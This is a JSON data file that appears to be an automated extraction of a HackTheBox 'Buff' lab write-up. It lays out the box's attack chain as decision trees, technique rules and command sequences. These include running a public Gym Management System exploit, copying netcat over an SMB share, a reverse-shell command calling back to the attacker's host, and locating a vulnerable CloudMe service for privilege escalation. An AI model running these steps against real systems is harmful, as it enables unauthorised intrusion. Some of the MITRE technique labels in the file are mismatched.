@@ -1,0 +1,873 @@
+{
+  "writeup_id": "Htb_Buff",
+  "scenario_fingerprint": {
+    "scenario_name": "windows_web_application_rce_privesc",
+    "primary_services": [
+      "http",
+      "unknown_service"
+    ],
+    "port_signature": "7680+8080",
+    "service_combination": "apache+php+custom_service",
+    "os_family": "windows",
+    "environment_type": "web_application_server",
+    "entry_vector": "web_application_exploit",
+    "privilege_path": "webshell_to_admin_via_service_exploit",
+    "attack_complexity": "easy",
+    "estimated_time": "45-90 minutes",
+    "scenario_confidence": 0.92,
+    "distinguishing_factors": [
+      "gym_management_system_software",
+      "unauthenticated_rce_vulnerability",
+      "localhost_only_service_on_7680",
+      "public_exploit_available"
+    ],
+    "environmental_clues": [
+      "xampp_installation",
+      "php_web_application",
+      "apache_on_non_standard_port",
+      "pando_pub_service"
+    ],
+    "similar_scenarios": [
+      "oscp_style_boxes",
+      "web_app_to_system_escalation"
+    ],
+    "unique_aspects": [
+      "projectworlds_framework",
+      "png_upload_filter_bypass",
+      "tunneling_required_for_privesc"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "Web Application Exploitation",
+        "success_reason": "Gym Management System 1.0 had unauthenticated RCE vulnerability",
+        "prerequisite_indicators": [
+          "web_application_running",
+          "php_backend_detected",
+          "known_vulnerable_software"
+        ],
+        "recognition_patterns": [
+          "copyright links to projectworlds.in",
+          "README.md reveals software name",
+          "contact page displays framework name",
+          "large number of PHP pages suggests framework"
+        ],
+        "failure_modes": [
+          "software_patched_or_updated",
+          "upload_directory_not_writable",
+          "file_upload_filters_blocking"
+        ],
+        "environmental_factors": [
+          "default_xampp_installation",
+          "unpatched_web_application",
+          "permissive_file_upload_settings"
+        ],
+        "success_probability": 0.95,
+        "typical_timeframe": "10-20 minutes"
+      },
+      {
+        "technique": "File Upload Filter Bypass",
+        "success_reason": "PNG magic bytes bypass allowed webshell upload",
+        "prerequisite_indicators": [
+          "file_upload_functionality_exists",
+          "weak_file_type_validation",
+          "upload_directory_accessible"
+        ],
+        "recognition_patterns": [
+          "upload.php endpoint available",
+          "file extension filtering only",
+          "magic byte validation bypassable",
+          "webshell execution in upload directory"
+        ],
+        "failure_modes": [
+          "strict_file_type_validation",
+          "upload_directory_not_executable",
+          "comprehensive_content_filtering"
+        ],
+        "environmental_factors": [
+          "php_execution_in_upload_directory",
+          "insufficient_input_validation",
+          "default_apache_configuration"
+        ],
+        "success_probability": 0.85,
+        "typical_timeframe": "5-10 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "Gym Management System 1.0 software identification",
+        "discovery_method": "Manual enumeration of contact page and copyright links",
+        "why_critical": "Led to finding known RCE exploit in searchsploit",
+        "how_to_recognize": [
+          "projectworlds.in copyright links",
+          "framework name on contact page",
+          "README.md in web root",
+          "consistent PHP page structure"
+        ],
+        "follow_up_actions": [
+          "search_for_known_exploits",
+          "test_unauthenticated_rce",
+          "upload_webshell_via_exploit"
+        ]
+      },
+      {
+        "discovery": "Port 7680 unknown service",
+        "discovery_method": "nmap port scan",
+        "why_critical": "Potential privilege escalation vector",
+        "how_to_recognize": [
+          "uncommon port open",
+          "service not immediately identifiable",
+          "localhost-only binding pattern"
+        ],
+        "follow_up_actions": [
+          "enumerate_service_after_initial_access",
+          "check_for_local_exploits",
+          "setup_port_forwarding_if_needed"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "web_user_shaun",
+        "escalation_method": "Unknown_service_on_port_7680",
+        "why_possible": "Additional service likely vulnerable and accessible from compromised account",
+        "recognition_signs": [
+          "nmap_shows_unknown_service",
+          "service_running_as_higher_privilege",
+          "localhost_only_binding_suggests_internal_service"
+        ],
+        "exploitation_path": "Initial RCE → Service Enumeration → Port 7680 Exploit → Administrator"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found ports 7680,8080 open on Windows host with Apache/PHP",
+        "decision": "Identify web application framework and search for known vulnerabilities",
+        "reasoning": "Limited attack surface suggests focusing on web application exploitation",
+        "confidence": 0.9,
+        "alternatives": [
+          {
+            "option": "directory_bruteforce",
+            "when": "if framework identification fails"
+          },
+          {
+            "option": "manual_web_testing",
+            "when": "if no public exploits found"
+          }
+        ],
+        "success_indicators": [
+          "framework_name_discovered",
+          "version_information_found",
+          "public_exploits_available"
+        ],
+        "next_decision": "exploit_web_application"
+      },
+      {
+        "step": 2,
+        "situation": "Identified Gym Management System 1.0 with known RCE",
+        "decision": "Use public exploit for unauthenticated RCE",
+        "reasoning": "Searchsploit shows available exploit for exact version",
+        "confidence": 0.95,
+        "prerequisites": [
+          "framework_identified",
+          "exploit_script_available"
+        ],
+        "success_indicators": [
+          "webshell_uploaded",
+          "command_execution_confirmed"
+        ],
+        "failure_fallbacks": [
+          "manual_exploit_analysis",
+          "alternative_web_attacks"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Obtained webshell but limited functionality",
+        "decision": "Upgrade to full reverse shell using nc64.exe",
+        "reasoning": "Webshell lacks persistence and directory navigation",
+        "confidence": 0.85,
+        "prerequisites": [
+          "command_execution_available",
+          "network_connectivity"
+        ],
+        "success_indicators": [
+          "reverse_shell_established",
+          "persistent_access_confirmed"
+        ],
+        "failure_fallbacks": [
+          "powershell_reverse_shell",
+          "alternative_shell_methods"
+        ]
+      },
+      {
+        "step": 4,
+        "situation": "Have user-level shell, need privilege escalation",
+        "decision": "Enumerate localhost services with netstat",
+        "reasoning": "Windows privilege escalation often involves local services",
+        "confidence": 0.8,
+        "prerequisites": [
+          "user_shell_established"
+        ],
+        "success_indicators": [
+          "localhost_services_discovered",
+          "unusual_ports_identified"
+        ],
+        "failure_fallbacks": [
+          "winpeas_enumeration",
+          "manual_privilege_escalation_checks"
+        ]
+      }
+    ],
+    "branching_logic": {
+      "if_web_framework_identified": {
+        "action": "search_for_public_exploits",
+        "tools": [
+          "searchsploit",
+          "exploit-db"
+        ],
+        "next_phase": "exploit_execution"
+      },
+      "if_public_exploit_available": {
+        "action": "analyze_and_execute_exploit",
+        "tools": [
+          "python",
+          "custom_exploit_script"
+        ],
+        "next_phase": "shell_upgrade"
+      },
+      "if_webshell_obtained": {
+        "action": "upgrade_to_reverse_shell",
+        "tools": [
+          "nc64.exe",
+          "smbserver.py"
+        ],
+        "next_phase": "privilege_escalation_enumeration"
+      },
+      "if_localhost_services_found": {
+        "action": "investigate_unusual_services",
+        "purpose": "find_privilege_escalation_vector",
+        "tools": [
+          "netstat",
+          "process_enumeration"
+        ]
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_identify_web_framework_before_generic_testing",
+        "reasoning": "framework_specific_exploits_more_reliable_than_generic_attacks",
+        "applicability": "web_application_targets"
+      },
+      {
+        "rule": "upgrade_webshell_to_reverse_shell_immediately",
+        "reasoning": "better_functionality_and_persistence_for_enumeration",
+        "applicability": "limited_webshell_access"
+      },
+      {
+        "rule": "enumerate_localhost_services_on_windows_targets",
+        "reasoning": "common_privilege_escalation_vector_through_local_services",
+        "applicability": "windows_user_level_access"
+      },
+      {
+        "rule": "use_smbserver_for_file_transfers_on_windows",
+        "reasoning": "reliable_method_for_tool_deployment",
+        "applicability": "windows_targets_with_smb_access"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "Web Application Exploitation",
+        "mitre_id": "T1190",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "windows",
+          "linux"
+        ],
+        "environmental_prerequisites": [
+          "web_service_accessible",
+          "vulnerable_web_application",
+          "public_exploits_available"
+        ],
+        "success_indicators": [
+          "application_version_identified",
+          "exploit_database_match_found",
+          "upload_functionality_present"
+        ],
+        "incompatible_with": [
+          "web_application_firewall_blocking",
+          "application_fully_patched",
+          "upload_restrictions_enforced"
+        ],
+        "confidence_boosters": [
+          "framework_name_disclosed",
+          "version_information_exposed",
+          "default_configurations_present"
+        ],
+        "typical_success_rate": 0.75,
+        "estimated_time": "10-30 minutes"
+      },
+      {
+        "technique": "File Upload Bypass",
+        "mitre_id": "T1105",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "windows",
+          "linux"
+        ],
+        "environmental_prerequisites": [
+          "file_upload_functionality",
+          "weak_file_validation",
+          "web_accessible_upload_directory"
+        ],
+        "success_indicators": [
+          "upload_endpoint_accessible",
+          "file_extension_filtering_bypassable",
+          "magic_bytes_validation_present"
+        ],
+        "incompatible_with": [
+          "strict_file_type_validation",
+          "upload_directory_not_executable",
+          "comprehensive_input_sanitization"
+        ],
+        "confidence_boosters": [
+          "php_backend_detected",
+          "upload_directory_browseable",
+          "weak_mime_type_checking"
+        ],
+        "typical_success_rate": 0.68,
+        "estimated_time": "15-45 minutes"
+      },
+      {
+        "technique": "Directory Enumeration",
+        "mitre_id": "T1083",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "windows",
+          "linux"
+        ],
+        "environmental_prerequisites": [
+          "web_service_accessible",
+          "directory_listing_enabled_or_guessable_paths"
+        ],
+        "success_indicators": [
+          "common_directories_accessible",
+          "framework_specific_paths_found",
+          "sensitive_files_exposed"
+        ],
+        "incompatible_with": [
+          "directory_listing_disabled",
+          "custom_error_pages_configured",
+          "path_obfuscation_implemented"
+        ],
+        "confidence_boosters": [
+          "default_framework_structure",
+          "readme_files_present",
+          "admin_directories_accessible"
+        ],
+        "typical_success_rate": 0.82,
+        "estimated_time": "5-20 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "web_application": {
+        "port_indicators": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "service_indicators": [
+          "http",
+          "https",
+          "apache",
+          "nginx",
+          "iis"
+        ],
+        "banner_indicators": [
+          "Apache",
+          "nginx",
+          "IIS",
+          "PHP"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "php_application": {
+        "port_indicators": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "technology_indicators": [
+          "PHP",
+          "apache",
+          "xampp"
+        ],
+        "confidence_threshold": 0.85
+      },
+      "windows_web_server": {
+        "port_indicators": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "banner_indicators": [
+          "Win64",
+          "Windows",
+          "IIS"
+        ],
+        "confidence_threshold": 0.88
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "web_application_exploitation",
+          "when": "web_service_detected_and_framework_identified",
+          "reason": "high_success_rate_with_public_exploits"
+        },
+        {
+          "attack": "directory_enumeration",
+          "when": "web_service_detected",
+          "reason": "reveals_application_structure_and_sensitive_files"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "file_upload_bypass",
+          "when": "upload_functionality_detected",
+          "reason": "reliable_but_requires_upload_endpoint"
+        },
+        {
+          "attack": "version_fingerprinting",
+          "when": "web_framework_detected",
+          "reason": "enables_targeted_exploit_selection"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "Web Application Exploitation",
+        "mitre_id": "T1190",
+        "category": "initial_access",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "searchsploit",
+            "command_template": "searchsploit {software_name}",
+            "actual_command": "searchsploit gym management",
+            "output_pattern": "Gym Management System 1.0 - Unauthenticated Remote Code Execution",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          },
+          {
+            "name": "gym_management_rce.py",
+            "command_template": "python {exploit_script} http://{target_ip}:{port}/",
+            "actual_command": "python gym_management_rce.py http://10.10.10.198:8080/",
+            "success_factors": [
+              "vulnerable_version",
+              "upload_functionality_present"
+            ],
+            "effectiveness_rating": 5
+          }
+        ],
+        "prerequisites": [
+          "web_service_accessible",
+          "vulnerable_software_version",
+          "upload_functionality_enabled"
+        ],
+        "success_indicators": [
+          "webshell_upload_successful",
+          "command_execution_achieved",
+          "user_context_established"
+        ],
+        "common_failures": [
+          "patched_software_version",
+          "upload_restrictions_blocking",
+          "web_application_firewall"
+        ],
+        "follow_up_techniques": [
+          "privilege_escalation",
+          "lateral_movement",
+          "persistence_establishment"
+        ],
+        "time_investment": "5-15 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "Buffer Overflow Exploitation",
+        "mitre_id": "T1055",
+        "category": "privilege_escalation",
+        "phase": "privilege_escalation",
+        "tools_used": [
+          {
+            "name": "searchsploit",
+            "command_template": "searchsploit {service_name}",
+            "actual_command": "searchsploit cloudme",
+            "output_pattern": "CloudMe 1.11.2 - Buffer Overflow",
+            "effectiveness_rating": 4,
+            "reliability": 0.9
+          },
+          {
+            "name": "netstat",
+            "command_template": "netstat -ano | findstr TCP | findstr \":0\"",
+            "actual_command": "netstat -ano | findstr TCP | findstr \":0\"",
+            "purpose": "Identify localhost-only services",
+            "effectiveness_rating": 5
+          },
+          {
+            "name": "tasklist",
+            "command_template": "tasklist /v | findstr {pid}",
+            "actual_command": "tasklist /v | findstr 2820",
+            "purpose": "Identify process from PID",
+            "effectiveness_rating": 5
+          }
+        ],
+        "prerequisites": [
+          "vulnerable_service_running",
+          "service_accessible_via_tunnel",
+          "exploit_code_available"
+        ],
+        "success_indicators": [
+          "service_identified_on_localhost",
+          "vulnerable_version_confirmed",
+          "exploit_payload_ready"
+        ],
+        "common_failures": [
+          "service_not_accessible",
+          "exploit_mitigation_active",
+          "incorrect_payload_architecture"
+        ],
+        "follow_up_techniques": [
+          "tunnel_establishment",
+          "payload_customization",
+          "privilege_verification"
+        ],
+        "time_investment": "15-45 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "Network Tunneling",
+        "mitre_id": "T1572",
+        "category": "command_and_control",
+        "phase": "privilege_escalation",
+        "tools_used": [
+          {
+            "name": "nc64.exe",
+            "command_template": "\\programdata\\nc.exe -e cmd {attacker_ip} {port}",
+            "actual_command": "\\programdata\\nc.exe -e cmd 10.10.14.20 443",
+            "purpose": "Establish reverse shell",
+            "effectiveness_rating": 5
+          },
+          {
+            "name": "smbserver.py",
+            "command_template": "smbserver.py share . -smb2support -username {user} -password {pass}",
+            "actual_command": "smbserver.py share . -smb2support -username df -password df",
+            "purpose": "File transfer mechanism",
+            "effectiveness_rating": 4
+          }
+        ],
+        "prerequisites": [
+          "initial_shell_access",
+          "network_connectivity",
+          "file_transfer_capability"
+        ],
+        "success_indicators": [
+          "stable_shell_established",
+          "file_transfer_successful",
+          "localhost_services_accessible"
+        ],
+        "common_failures": [
+          "antivirus_blocking_nc",
+          "smb_connectivity_issues",
+          "firewall_restrictions"
+        ],
+        "follow_up_techniques": [
+          "port_forwarding",
+          "localhost_service_exploitation",
+          "privilege_escalation"
+        ],
+        "time_investment": "10-20 minutes",
+        "skill_level": "beginner"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "searchsploit",
+        "use_case": "vulnerability_identification",
+        "effectiveness_rating": 5,
+        "reliability": 0.95,
+        "learning_curve": "low",
+        "essential_for": [
+          "exploit_development",
+          "vulnerability_research"
+        ],
+        "alternatives": [
+          "manual_cve_search",
+          "metasploit_search"
+        ],
+        "best_practices": [
+          "search_exact_software_names",
+          "verify_version_numbers",
+          "test_exploits_in_lab_first"
+        ]
+      },
+      {
+        "tool": "gobuster",
+        "use_case": "web_directory_enumeration",
+        "effectiveness_rating": 4,
+        "reliability": 0.9,
+        "learning_curve": "low",
+        "essential_for": [
+          "web_application_testing"
+        ],
+        "alternatives": [
+          "dirbuster",
+          "ffuf",
+          "dirb"
+        ],
+        "best_practices": [
+          "include_relevant_extensions",
+          "use_appropriate_wordlists",
+          "adjust_thread_count_for_stability"
+        ]
+      },
+      {
+        "tool": "netstat",
+        "use_case": "network_service_discovery",
+        "effectiveness_rating": 5,
+        "reliability": 0.98,
+        "learning_curve": "low",
+        "essential_for": [
+          "privilege_escalation",
+          "lateral_movement"
+        ],
+        "alternatives": [
+          "ss",
+          "powershell_get-netstat"
+        ],
+        "best_practices": [
+          "check_localhost_only_services",
+          "correlate_pids_with_processes",
+          "identify_unusual_ports"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "gym_management_exploitation",
+        "steps": [
+          {
+            "step": 1,
+            "command": "searchsploit gym management",
+            "purpose": "Find available exploits",
+            "expected_output": "Gym Management System 1.0 - Unauthenticated Remote Code Execution"
+          },
+          {
+            "step": 2,
+            "command": "searchsploit -m php/webapps/48506.py",
+            "purpose": "Copy exploit to working directory",
+            "expected_output": "Exploit copied to ./48506.py"
+          },
+          {
+            "step": 3,
+            "command": "python 48506.py http://10.10.10.198:8080/",
+            "purpose": "Execute exploit and gain webshell",
+            "expected_output": "Successfully connected to webshell"
+          }
+        ],
+        "success_rate": 0.92,
+        "typical_duration": "5-10 minutes"
+      },
+      {
+        "sequence_name": "shell_upgrade_via_smb",
+        "steps": [
+          {
+            "step": 1,
+            "command": "smbserver.py share . -smb2support -username df -password df",
+            "purpose": "Start SMB server for file transfer",
+            "expected_output": "SMB server listening"
+          },
+          {
+            "step": 2,
+            "command": "net use \\\\10.10.14.20\\share /u:df df",
+            "purpose": "Map SMB share on target",
+            "expected_output": "The command completed successfully"
+          },
+          {
+            "step": 3,
+            "command": "copy \\\\10.10.14.20\\share\\nc64.exe \\programdata\\nc.exe",
+            "purpose": "Transfer netcat to target",
+            "expected_output": "1 file(s) copied"
+          },
+          {
+            "step": 4,
+            "command": "\\programdata\\nc.exe -e cmd 10.10.14.20 443",
+            "purpose": "Establish reverse shell",
+            "expected_output": "Connection established at listener"
+          }
+        ],
+        "success_rate": 0.85,
+        "typical_duration": "10-15 minutes"
+      },
+      {
+        "sequence_name": "localhost_service_discovery",
+        "steps": [
+          {
+            "step": 1,
+            "command": "netstat -ano | findstr TCP | findstr \":0\"",
+            "purpose": "Identify listening services",
+            "expected_output": "List of listening ports and PIDs"
+          },
+          {
+            "step": 2,
+            "command": "tasklist /v | findstr 2820",
+            "purpose": "Identify process from PID",
+            "expected_output": "CloudMe.exe process identified"
+          },
+          {
+            "step": 3,
+            "command": "searchsploit cloudme",
+            "purpose": "Find CloudMe exploits",
+            "expected_output": "Multiple buffer overflow exploits found"
+          }
+        ],
+        "success_rate": 0.95,
+        "typical_duration": "5-10 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Buff",
+      "difficulty": "Easy",
+      "os": "Windows",
+      "platform": "HackTheBox",
+      "release_date": "2020-07-18",
+      "author": "egotisticalSW",
+      "estimated_time": "60-90 minutes"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "low",
+      "skill_level_required": "beginner",
+      "primary_attack_vectors": [
+        "web_exploitation",
+        "public_exploits"
+      ],
+      "key_vulnerabilities": [
+        "vulnerable_web_software",
+        "localhost_service_exploitation"
+      ],
+      "environment_type": "web_server_windows",
+      "real_world_relevance": "high",
+      "learning_value": [
+        "public_exploit_usage",
+        "tunneling",
+        "shellcode_modification"
+      ],
+      "prerequisite_knowledge": [
+        "basic_web_enumeration",
+        "exploit_modification",
+        "port_forwarding"
+      ]
+    },
+    "categorization": {
+      "primary_category": "web_exploitation",
+      "subcategories": [
+        "public_exploits",
+        "privilege_escalation",
+        "tunneling"
+      ],
+      "attack_types": [
+        "initial_access",
+        "privilege_escalation"
+      ],
+      "defensive_lessons": [
+        "patch_management",
+        "service_hardening",
+        "network_segmentation"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Grandpa",
+        "Granny",
+        "Devel"
+      ],
+      "similarity_reasons": [
+        "web_exploitation",
+        "public_exploits",
+        "windows_privesc"
+      ],
+      "unique_aspects": [
+        "localhost_tunneling",
+        "shellcode_modification",
+        "oscp_style"
+      ],
+      "difficulty_factors": [
+        "straightforward_exploit_chain",
+        "well_documented_vulnerabilities"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-04T23:29:24.393101",
+    "original_file": "0xdf_writeups/Htb Buff.md",
+    "content_length": 30233,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 0.9166666666666667,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 0.6666666666666666,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
